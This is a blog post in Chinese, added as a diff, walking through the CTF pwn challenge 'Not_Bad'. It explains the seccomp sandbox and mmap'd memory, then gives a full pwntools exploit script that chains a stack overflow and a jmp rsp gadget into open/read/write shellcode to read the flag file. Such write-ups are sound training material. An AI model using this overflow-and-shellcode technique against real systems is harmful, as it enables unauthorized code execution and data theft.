@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="ORW-[极客大挑战2019]Not_Bad" />
+    <meta property="og:title" content="ORW-[极客大挑战2019]Not_Bad" />
+    <meta property="twitter:title" content="ORW-[极客大挑战2019]Not_Bad" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>ORW-[极客大挑战2019]Not_Bad | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/orw-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019not_bad/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ctf" title="CTF">
+                            CTF
+                        </a>
+                        
+                        <a class="tag" href="/tags/shellcode" title="Shellcode">
+                            Shellcode
+                        </a>
+                        
+                        <a class="tag" href="/tags/orw" title="ORW">
+                            ORW
+                        </a>
+                        
+                    </div>
+                    <h1>ORW-[极客大挑战2019]Not_Bad</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Saturday, February 8, 2020
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <p>
+  <img src="/img/ORW-[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%982019]Not_Bad/image-20200203001107437.png" alt="image-20200203001107437">
+
+</p>
+<h2 id="rwx">RWX</h2>
+<blockquote>
+<ul>
+<li>Linux的文件和目录的权限，有RWX三种。</li>
+<li>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有<strong>浏览目录</strong>的权限。</li>
+<li>w(Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有<strong>新建，删除，修改，移动目录内文件</strong>的权限。</li>
+<li>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说<strong>该用户具有进入目录</strong>的权限</li>
+</ul>
+</blockquote>
+<p>
+  <img src="/img/ORW-[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%982019]Not_Bad/image-20200203144946071.png" alt="image-20200203144946071">
+
+</p>
+<p><a href="%5Bhttps://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/%5D(https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/)">什么是seccomp</a></p>
+<p>用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>检测一下<code>seccomp-tools dump  ./bad </code></p>
+<p>
+  <img src="/img/ORW-[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%982019]Not_Bad/image-20200203145031485.png" alt="image-20200203145031485">
+
+</p>
+<p>可运行open,read,write，也就是ORW</p>
+<h2 id="关键点">关键点</h2>
+<p>
+  <img src="/img/ORW-[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%982019]Not_Bad/image-20200203145324266.png" alt="image-20200203145324266">
+
+</p>
+<p>
+  <img src="/img/ORW-[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%982019]Not_Bad/image-20200203145300314.png" alt="image-20200203145300314">
+
+</p>
+<p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p>
+<blockquote>
+<p>mmap()函数的主要用途有三个：
+1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；
+2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；
+3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。
+————————————————
+版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
+<a href="https://blog.csdn.net/yzy1103203312/article/details/78286360">原文链接</a></p>
+</blockquote>
+<p>总的来说就是，我们可以在这里写入orw_shellcode然后运行hhh</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    orw_shellcode <span style="color:#ff79c6">=</span> shellcraft<span style="color:#ff79c6">.</span>open(<span style="color:#f1fa8c">&#34;./flag&#34;</span>)
+</span></span><span style="display:flex;"><span>    orw_shellcode <span style="color:#ff79c6">+=</span> shellcraft<span style="color:#ff79c6">.</span>read(<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">0x123000</span>,<span style="color:#bd93f9">0x30</span>)
+</span></span><span style="display:flex;"><span>    orw_shellcode <span style="color:#ff79c6">+=</span> shellcraft<span style="color:#ff79c6">.</span>write(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">0x123000</span>,<span style="color:#bd93f9">0x30</span>)
+</span></span></code></pre></div><p>read(3,addr,length)，3指从文件目录中读取</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> payload <span style="color:#ff79c6">=</span> asm(shellcraft<span style="color:#ff79c6">.</span>read(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0x123000</span>,<span style="color:#bd93f9">0x90</span>)) <span style="color:#ff79c6">+</span> asm(<span style="color:#f1fa8c">&#34;mov rax,0x123000;call rax&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> payload<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x28</span>,<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0x400A01</span>)<span style="color:#6272a4">#jmp rsp</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> asm(<span style="color:#f1fa8c">&#34;sub rsp,0x30;call rsp&#34;</span>)
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span></code></pre></div><p>这样子，我们溢出之后，先执行jmp rsp，然后读入到0x123000的shellcdoe，读入完成之后执行call rax运行shellcode</p>
+<h2 id="完整exp">完整exp</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./bad&#39;</span>)
+</span></span><span style="display:flex;"><span>lib <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pwn</span>(ip,port,debug):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> lib
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> sh
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> debug <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
+</span></span><span style="display:flex;"><span>        sh <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./bad&#39;</span>)
+</span></span><span style="display:flex;"><span>        lib <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        sh <span style="color:#ff79c6">=</span> remote(ip,port)
+</span></span><span style="display:flex;"><span>        lib <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;/home/robye/Desktop/PWN/libc/64-libc-2.27.so&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    orw_shellcode <span style="color:#ff79c6">=</span> shellcraft<span style="color:#ff79c6">.</span>open(<span style="color:#f1fa8c">&#34;./flag&#34;</span>)
+</span></span><span style="display:flex;"><span>    orw_shellcode <span style="color:#ff79c6">+=</span> shellcraft<span style="color:#ff79c6">.</span>read(<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">0x123000</span>,<span style="color:#bd93f9">0x30</span>)
+</span></span><span style="display:flex;"><span>    orw_shellcode <span style="color:#ff79c6">+=</span> shellcraft<span style="color:#ff79c6">.</span>write(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">0x123000</span>,<span style="color:#bd93f9">0x30</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;fun!&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> asm(shellcraft<span style="color:#ff79c6">.</span>read(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0x123000</span>,<span style="color:#bd93f9">0x90</span>)) <span style="color:#ff79c6">+</span> asm(<span style="color:#f1fa8c">&#34;mov rax,0x123000;call rax&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> payload<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x28</span>,<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0x400A01</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> asm(<span style="color:#f1fa8c">&#34;sub rsp,0x30;call rsp&#34;</span>)
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#bd93f9">0.1</span>)
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>sendline(asm(orw_shellcode))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span>  <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    pwn(<span style="color:#f1fa8c">&#34;node3.buuoj.cn&#34;</span>,<span style="color:#bd93f9">26591</span>,<span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><p>向<a href="http://www.qfrost.com/PWN/geek_pwn/">Qfroest</a>大佬学习</p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/ropgadget%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/" data-toggle="tooltip" data-placement="top" title="ROPgadget&amp;系统调用-cmcc_simplerop">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/" data-toggle="tooltip" data-placement="top" title="商业计划书撰写及案例分析">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
